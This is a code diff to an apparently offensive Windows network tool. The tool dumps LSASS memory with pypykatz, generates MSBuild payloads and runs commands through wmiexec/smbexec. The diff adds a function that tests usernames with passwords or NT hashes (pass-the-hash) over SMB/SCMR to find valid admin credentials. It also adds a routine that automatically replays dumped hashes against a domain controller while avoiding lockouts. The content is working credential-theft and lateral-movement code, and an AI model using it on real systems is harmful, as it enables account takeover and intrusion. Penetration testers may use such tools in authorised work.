@@ -50,6 +50,8 @@ SERVICE_NAME = ''.join(random.choices(string.ascii_uppercase, k=random.randrange
 OUTPUT_FILENAME = '__' + str(time.time())
 CODEC = sys.stdout.encoding
 timestamp = str(datetime.fromtimestamp(time.time())).replace(' ', '_')
+acct_chk_fail = [] # this list is used to track failed login attempts
+acct_chk_valid = [] # this is used to track previously valid accounts
 
 ###################COLORS#################
 color_RED = '\033[91m'
@@ -59,6 +61,8 @@ color_BLU = '\033[94m'
 color_PURP = '\033[35m'
 color_reset = '\033[0m'
 green_plus = "{}[+]{}".format(color_GRE, color_reset)
+red_minus = "{}[-]{}".format(color_RED, color_reset)
+gold_plus = "{}[+]{}".format(color_YELL, color_reset)
 
 reaper_banner = """
 
@@ -733,6 +737,51 @@ def load_smbclient_auth_file(path):
 
 ############################################################################### END OF WMIEXEC#####################################################
 
+def check_accts(username, password, domain, remoteName, remoteHost, hashes=None,aesKey=None, doKerberos=None, kdcHost=None, port=445):
+    upasscombo = '{}:{}'.format(username, password)
+
+    nthash = ''
+    lmhash = ''
+    if hashes is not None:
+        lmhash, nthash = hashes.split(':')
+        upasscombo = '{}:{}'.format(username, nthash)
+
+    stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
+    logging.debug('StringBinding %s' % stringbinding)
+    rpctransport = transport.DCERPCTransportFactory(stringbinding)
+    rpctransport.set_dport(port)
+    rpctransport.setRemoteHost(remoteHost)
+    if hasattr(rpctransport, 'set_credentials'):
+        # This method exists only for selected protocol sequences.
+        rpctransport.set_credentials(username, password, domain, lmhash, nthash, aesKey)
+
+    rpctransport.set_kerberos(doKerberos, kdcHost)
+
+    try:
+        samr = rpctransport.get_dce_rpc()
+        try:
+            samr.connect()
+        except Exception as e:
+            acct_chk_fail.append(username)
+            printnlog('{} {} {}'.format(red_minus, upasscombo.ljust(30), str(e)[:str(e).find("(")]))
+
+
+        s = rpctransport.get_smb_connection()
+        s.setTimeout(100000)
+        samr.bind(scmr.MSRPC_UUID_SCMR)
+        resp = scmr.hROpenSCManagerW(samr)
+        scHandle = resp['lpScHandle']
+        acct_chk_valid.append(username)
+        printnlog('{} {} {}'.format(gold_plus, upasscombo.ljust(30), "Valid Admin Creds"))
+
+
+    except  (Exception, KeyboardInterrupt) as e:
+        if str(e).find("rpc_s_access_denied") != -1 and str(e).find("STATUS_OBJECT_NAME_NOT_FOUND") == -1:
+            acct_chk_valid.append(username)
+            printnlog('{} {} {}'.format(green_plus, upasscombo.ljust(30), "Valid Creds"))
+
+
+
 def do_ip(inpu, local_ip):  # check if the inputted ips are up so we dont scan thigns we dont need to
     printnlog('\n[scanning hosts]')
     scanner = nmap.PortScanner()
@@ -959,6 +1008,7 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array,
     xml_payload += "                </Task>\n"
     xml_payload += "        </UsingTask>\n"
     xml_payload += "</Project>"
+
     with open('/var/tmp/{}/{}.xml'.format(share_name, payload_name), 'w') as f:
         f.write(xml_payload)
         f.close()
@@ -1507,7 +1557,7 @@ if __name__ == '__main__':
         if options.drive is None and (options.method == 'wmiexec' or options.method == 'smbexec') and options.oe == False:
             drive_letter = auto_drive(addresses, domain)
 
-        if options.oe:
+        if options.oe: # I cannot for the life of me remember why this is in here
             addresses = ['23423.5463.1234.3465']
 
         if options.payload == 'msbuild':
@@ -1565,7 +1615,7 @@ if __name__ == '__main__':
         if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
             os.system('sudo rm {}/drives.txt'.format(cwd))
 
-        if options.ap != False:
+        if options.ap:
             printnlog("\n[parsing files]")
             os.system("sudo python3 -m pypykatz lsa minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full.txt".format(cwd, timestamp, cwd, timestamp))
             os.system("sudo python3 -m pypykatz lsa -g minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full_grep.grep".format(cwd, timestamp, cwd, timestamp))
@@ -1574,6 +1624,48 @@ if __name__ == '__main__':
             remove_files = input('\nWould you like to delete the .dmp files now? (Y/n) ')
             if remove_files.lower() == 'y':
                 os.system('sudo rm {}/loot/{}/*.dmp'.format(cwd, timestamp))
+
+            if input('\nWould you like to autovalidate that any dumped NT hashes are valid? (y/N) ').lower() == 'y':
+                printnlog('\n{} Reading dumped_msv.txt'.format(green_plus))
+                try:
+                    with open('{}/loot/{}/dumped_msv.txt'.format(cwd, timestamp), 'r') as f: # read the dumped_msv.txt file into msv_creds
+                        msv_creds = f.readlines()
+                        f.close()
+                except BaseException as e:
+                    printnlog('\n{}[!]{} There was an error reading the dumped_msv.txt file'.format(color_RED, color_reset))
+                else:
+                    msv_creds_cleaned = []
+                    for cred in msv_creds: # here we are going to remove any \r\n and any items that are missing a username
+                        cred = cred.replace('\n', '')
+                        cred = cred.replace('\r', '')
+                        if cred.find('::') == -1 and cred.find('Domain:Username:NT:LM') == -1:
+                            msv_creds_cleaned.append(cred)
+                    if len(msv_creds_cleaned) > 0:
+                        ip_to_check_against = input("\nEnter an IP to check the accounts against (Preferably a domain controller): ")
+
+                        printnlog('\n{} Attempting to check {} creds\n'.format(green_plus, len(msv_creds_cleaned)))
+                        tried_full = []
+                        for item in msv_creds_cleaned:
+                            try:
+                                if item not in tried_full: # this prevents duplicate attempts
+                                    idx_of_2nd_colon = item.find(":", item.find(":") + 1)
+                                    username = item[item.find(":")+1:idx_of_2nd_colon]
+                                    nthash = item[idx_of_2nd_colon+1:-1]
+                                    if acct_chk_fail.count(username) < 3: # antilockout check
+                                        if username not in acct_chk_valid: # why try again if we already found a valid set
+                                            check_accts(username, None, domain, ip_to_check_against, ip_to_check_against, ':'+nthash, None, False, None, int(445))
+                                            tried_full.append(item)
+                                        else:
+                                            printnlog('{}[!]{} Skipping {}:{} due to valid creds for account already found'.format(color_BLU, color_reset, username, nthash))
+                                    else:
+                                        printnlog('{}[!]{} Skipping {}:{} to prevent lockout'.format(color_BLU, color_reset, username, nthash))
+                                else:
+                                    printnlog('{}[!]{} Skipping {} because of duplicate creds'.format(color_BLU, color_reset, item))
+                            except Exception as e:
+                                printnlog(str(e))
+                        print("")
+                    else:
+                        printnlog('{} There are no creds to check'.format(red_minus))
 
     except KeyboardInterrupt as e:
         logging.error(str(e))
